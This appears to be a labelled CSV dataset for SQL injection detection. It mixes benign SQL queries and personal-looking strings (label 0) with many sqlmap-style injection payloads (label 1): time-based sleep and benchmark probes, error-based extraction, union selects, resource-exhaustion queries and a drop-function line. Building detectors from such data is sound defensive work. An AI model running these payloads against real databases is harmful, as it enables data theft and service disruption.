Query,Label
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
@var select @var as var into temp end --,1
"-2862'   )    )     )   union all select 6649,6649--",1
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
1.53418E+15,0
SELECT * FROM operation WHERE nothing BETWEEN '1996-07-01' AND '1996-07-31',0
1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,1
78595518x,0
18684547z,0
arre,0
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,1
"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",1
SELECT AVG ( theory ) FROM none,0
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",1
SELECT main,0
SELECT success FROM gate UNION SELECT selection FROM planned ORDER BY outside,0
"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
calle virgen de la macarena 72 2-c,0
SELECT MIN ( without )  AS pool FROM mental,0
SELECT * FROM tongue WHERE left = 'father' LIMIT 3,0
SELECT * FROM onto WHERE equally = 'square'  AND  ( guess = 'snake' OR break = 'bare' ) ,0
" SELECT * FROM along ORDER BY available, so",0
SELECT COUNT ( air ) FROM attempt,0
"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",1
keer,0
ha3fila,0
"1"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
soule terraza,0
SELECT * FROM dot WHERE broken = 'mine' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( valueID ) FROM he,0
ribera d'ondara,0
SELECT AVG ( except )  FROM speak  SELECT SUM ( sang ) ,0
"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
"1""  )   as kzuq where 4259  =  4259",1
"  SELECT wealthID AS ID, particularly AS brown FROM break",0
SELECT stream FROM sport,0
9867,0
"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
"  SELECT repeat,such,divide FROM stood LEFT JOIN Orders ON outer.pairID =  method.strength ORDER BY race.voice",0
SELECT somewhere,0
SELECT * FROM highest WHERE loose = 'still' FETCH FIRST 3 ROWS ONLY,0
"calle reina violante, 35,",0
"  SELECT noiseID AS ID, paint AS exactly FROM parts",0
SELECT * FROM build ORDER BY plenty DESC,0
closa ortell,0
SELECT DISTINCT shadow FROM dog,0
rattray@elgrancolisionadordehadrones.gl,0
select sleep  (  5   )    )   +',1
salerno.harmer@nexuspark.li,0
7.51221E+15,0
kobeski,0
"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",1
"royo, el",0
SELECT * FROM sitting  WHERE come = cotton,0
"  SELECT milkID AS ID, at AS spin FROM object",0
SELECT * FROM brain WHERE    NOT service = 'official',0
SELECT AVG ( harbor ) FROM sad SELECT SUM ( question ) ,0
"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food )  VALUES  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )  ",0
"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
" SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,1
trbena,0
"   SELECT say,grade,wise,engine,post     (  (  arrangement JOIN date ON bright.known =  fish.writing )   INNER JOIN teamON Orders.even =  tune.morningID ) ",0
"-8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze",1
rofes,0
SELECT dear FROM famous UNION SELECT equipment FROM power ORDER BY hurry,0
" SELECT * FROM being ORDER BY said ASC, coal DESC",0
1   )    )    as muyz where 6105  =  6105,1
2.23935E+15,0
ji-chuu,0
SELECT DISTINCT solid FROM help,0
1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1
afkham,0
"  SELECT soundID AS ID, blue AS view FROM information",0
13630,0
"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT * FROM your WHERE river = 'cast'  OR beyond = 'solid',0
yevtushenko-pegna@corjet.al,0
"-2605%'   )    )     )   union all select 4738,4738#",1
SELECT * FROM gift WHERE two BETWEEN '1996-07-01' AND '1996-07-31',0
pozaldez,0
dorice,0
"-3737%"" union all select 4452,4452,4452#",1
88918773z,0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"SELECT CAST ( ""14:06:10"" AS TIME ) ;",0
45810,0
"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1
SELECT * FROM rubber ORDER BY telephone DESC,0
manquel,0
-6190'   )    )     )   union all select 9413--,1
SELECT COUNT ( highestID ) FROM cry,0
SELECT * FROM freedom FETCH FIRST 50 PERCENT ROWS ONLY,0
borriol,0
villanueva de sigena,0
SELECT * FROM smooth WHERE lungs = 'gone',0
76150645z,0
SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,1
woolgar@awat.gov,0
SELECT indicate ( s )  FROM how SELECT equally FROM stretch,0
"  SELECT shine,sharp,progress FROM slope LEFT JOIN Orders ON impossible.explanationID =  shape.good ORDER BY join.bee",0
SELECT * FROM wp_posts WHERE ID  =  239189 LIMIT 1,0
philip7,0
SELECT breathing ( s )  FROM blood UNION,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_link' LIMIT 1,0
SELECT indeed ( s )  FROM rise LEFT JOIN,0
escritor lopez de cardenas 76 12e,0
madisett,0
FROM  ( SELECT DISTINCT area FROM take ) ,0
princep muntadas,0
SELECT 10 DIV 5;,0
"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM trap,0
SELECT * FROM machinery 3 SELECT * FROM southern,0
d0s9pi2car,0
-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
1'  )   as wquy where 2518  =  2518,1
drier@hotelesymas.cl,0
SELECT TOP 3 * FROM ought WHERE brain = 'birthday' SELECT * FROM major,0
"  UPDATE complex SET cover =  'union', City =  'catch' WHERE more =  see",0
"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",1
SELECT came ( s )  FROM wild SELECT if FROM temperature,0
galende,0
aflechate,0
end-- elvi,1
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 299801 )  ORDER BY meta_id ASC",0
SELECT * FROM simplest WHERE amount BETWEEN 'notice' AND 'five',0
1'+  (  select 'cwta' where 6091  =  6091,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 416 )  ORDER BY meta_id ASC",0
SELECT TOP 3 * FROM plus WHERE next = 'aside' SELECT * FROM create,0
SELECT * FROM  ( SELECT place FROM likely ) ,0
SELECT * FROM wp_posts WHERE ID  =  347687 LIMIT 1,0
mndez testua,0
iraola rudi,0
SELECT * FROM grandfather WHERE beneath NOT BETWEEN 'began' AND 'ants',0
SELECT * FROM sweet FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( property ) FROM flame SELECT SUM ( melted ) ,0
SELECT * FROM  ( SELECT flies FROM keep ) ,0
28287163s,0
1  )   or sleep  (  5  )  #,1
"   SELECT pretty, friend, successFROM wait WHERE independent  IS NOT NULL",0
"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos",1
SELECT * FROM eleven WHERE own = 'air'  AND  ( series = 'wheat' OR interior = 'bowl' ) ,0
9.26768E+15,0
SELECT * FROM sight ORDER BY advice DESC,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 252091 )  ORDER BY meta_id ASC",0
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1
imtaz,0
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,1
"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",1
" SELECT column_name ( s )  FROM our,swept",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx",1
"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",1
donadieu zanotti,0
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",1
concursado,0
SELECT * FROM underline FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pain,0
c/ rivera de los limonetes 98,0
"-8612""  )   or 4043  =  3083 and   (  ""pjzo"" like ""pjzo",1
"1'  )   union all select null,null--",1
" select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",1
"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT COUNT ( respectID ) FROM pressure,0
SELECT * FROM born 3 SELECT * FROM meant,0
galimany bifet,0
SELECT AVG ( alphabet ) FROM opinion SELECT SUM ( climb ) ,0
"1"" where 2221  =  2221 and 5318  =  8398--",1
1'+  (  select qugu where 2287  =  2287 order by 1#,1
SELECT MIN ( she )  AS his FROM spell,0
SELECT * FROM Customers  WHERE City LIKE '%es%';,0
SELECT * FROM bring 3,0
deloria,0
4458,0
SELECT * FROM private WHERE NOT also = 'test'  AND NOT sky = 'having',0
duby@mtos.mt,0
"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM negative WHERE root = 'light'  AND City = 'useful',0
SELECT * FROM country,0
"1""  )   as jscj where 2308  =  2308 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1.94093E+15,0
shou-che,0
mcavoy-zabczynski@discotecateatre.gt,0
"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
saint-simon-vondis@paremoselalzheimer.dj,0
3.94593E+15,0
SELECT * FROM forest FETCH FIRST 50 PERCENT ROWS ONLY,0
sant carles de la rpita,0
&1c,1
15,0
37130,0
"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",1
SELECT * FROM off WHERE motion = 'no',0
 UPDATE evening SET describe = 'song'WHERE section = 'whenever',0
"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"   SELECT Employees.tomorrow, COUNT ( Orders.silenceID )  AS heardFROM    ( OrdersINNER JOIN store ON Orders.islandID  =  Employees.elseID ) ",0
"1""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"  SELECT affect AS contain, draw AS [common]  FROM yesterday",0
SELECT * FROM motion ORDER BY fat DESC,0
if  (  6624  =  4232  )   select 6624 else drop function xyyt--,1
"1""  )   as ronb where 9368  =  9368",1
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM tea WHERE captain NOT BETWEEN 'just' AND 'park',0
SELECT AVG ( hospital ) FROM crop,0
SELECT * FROM serve WHERE tea BETWEEN move09/01/1996flies AND deer15/31/1996zoo,0
10328,0
"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat",1
SELECT * FROM discussion WHERE brass = 'stage'  AND  ( plural = 'men' OR gray = 'purple' ) ,0
SELECT COUNT ( driverID ) FROM north,0
 UPDATE sugar SET please = 'first'WHERE mass = 'shirt',0
SELECT AVG ( apartment ) FROM thy,0
darby,0
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,1
"1'  )   where 9091  =  9091 union all select null,null,null,null#",1
gambs galatioto,0
2.11E+15,0
"1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM together WHERE birthday IN  ( SELECT location FROM entire ) ,0
SELECT DISTINCT fuel FROM substance,0
SELECT * FROM me FETCH FIRST 3 ROWS ONLY,0
genaro,0
SELECT * FROM over WHERE market BETWEEN 'exact' AND 'specific',0
"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
SELECT MIN ( instant )  AS interior FROM monkey,0
1  )   or sleep  (  5  ) ,1
-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
"1%"" or sleep  (  5  )  #",1
SELECT * FROM keep  WHERE attached = gate,0
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk",1
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",1
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
sosao,0
gumersindo,0
"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",1
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM dinner WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM fall WHERE NOT attention = 'our'  AND NOT bad = 'plan',0
"  SELECT they,right,matter FROM therefore LEFT JOIN Orders ON positive.deadID =  shape.standard ORDER BY naturally.or",0
SELECT musical FROM topic,0
-4339  )   where 7178  =  7178 or 4008  =  7232,1
SELECT TOP 50 PERCENT * FROM win SELECT * FROM stranger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stiff,0
43470,0
"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c886d67719' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
riggsbee,0
"  SELECT rocky AS compound, chosen AS [lady]  FROM key",0
"1""   )    )     )  ",1
SELECT AVG ( floor ) FROM safe SELECT SUM ( desk ) ,0
"   SELECT sort,end,gradually,pilot,consider     (  (  train JOIN drop ON phrase.nice =  smooth.belong )   INNER JOIN dangerousON Orders.curious =  circle.systemID ) ",0
SELECT show FROM greatly UNION ALL SELECT view FROM red ORDER BY planet,0
1  )   where 2083  =  2083,1
SELECT COUNT ( DISTINCT breeze )  FROM mean,0
